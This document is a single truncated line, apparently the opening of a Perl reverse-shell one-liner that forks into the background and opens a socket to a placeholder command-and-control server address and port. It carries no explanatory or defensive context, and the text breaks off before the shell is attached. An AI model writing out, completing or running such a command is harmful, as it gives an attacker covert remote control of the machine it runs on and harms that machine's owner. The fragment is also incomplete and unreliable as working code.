perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"XX_CC_SERVER_IP:XX_PORT");
